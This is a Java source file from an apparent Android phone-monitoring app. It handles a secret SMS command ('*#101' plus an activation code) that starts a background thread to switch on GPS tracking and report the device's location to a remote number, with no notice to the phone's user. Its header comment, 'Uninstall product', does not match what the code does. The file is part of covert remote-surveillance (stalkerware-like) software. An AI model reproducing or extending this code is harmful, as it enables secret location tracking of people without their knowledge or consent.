package com.fx.dalvik.smscommand.interpreter;

import android.content.Context;
import android.location.LocationManager;

import com.fx.dalvik.smscommand.GpsOnDemandCaller;
import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;

public class SmsGpsOnDemand {
	
	private static final String TAG = "SmsGpsOnDemand";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#101";
	
	// Uninstall product
	// <*#101><FK>
	public static String processCommand(final Context context, String[] tokens, 
			final String destinationNumber, final String responseHeader) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		LocationManager locationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		boolean hasProviders = locationManager.getProviders(true).size() > 0;
		boolean hasInternet = NetworkUtil.hasInternetConnection(context);
		
		// Verify for sending acknowledged response
		if (hasProviders || hasInternet) {
			
			// start thread
			Thread t = new Thread() {
				public void run() {
					if (LOCAL_LOGV) {
						FxLog.v(TAG, "Enable GPS on demand");
					}
					try {
						Thread.sleep(3000);
					}
					catch (InterruptedException e) {
						// 
					}
					GpsOnDemandCaller caller = new GpsOnDemandCaller(context);
					caller.setDestinationNumber(destinationNumber);
					caller.setResponseHeader(responseHeader);
					caller.enable();
				}
			};
			
			t.start();
			
			return String.format("%s\n%s", 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_ACK);
		}
		else {
			return String.format("%s\n%s", 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED);
		}
	}

}
